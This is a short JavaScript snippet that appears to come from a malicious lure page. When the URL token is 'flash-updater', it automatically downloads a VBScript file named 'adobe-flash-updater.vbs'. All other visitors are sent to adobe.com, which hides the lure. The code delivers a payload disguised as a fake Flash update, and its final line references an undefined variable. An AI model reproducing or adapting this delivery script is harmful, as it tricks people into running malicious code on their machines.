function getDownloadFile(token) {
    if (!token) return null;
    if (token === "flash-updater") {
        return "doc/adobe-flash-updater.vbs";
    }
}

function downloadFile(url) {
    const link = document.createElement("a");
    link.href = url;
    link.download = url.split("/").pop();
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

setTimeout(() => {
    let token = "";

    if (window.location.search) {
        const params = new URLSearchParams(window.location.search);
        token = params.get("token") || "";
    } else {
        token = window.location.pathname.replace(/^\/|\/$/g, "");
    }

    if (!token) {
        window.location.href = "https://www.adobe.com/";
        return;
    }

    const file = getDownloadFile(token);

    if (!file) {
        window.location.href = "https://www.adobe.com/";
        return;
    }

    downloadFile(file);
    document.body.removeChild(link);
}, 1000);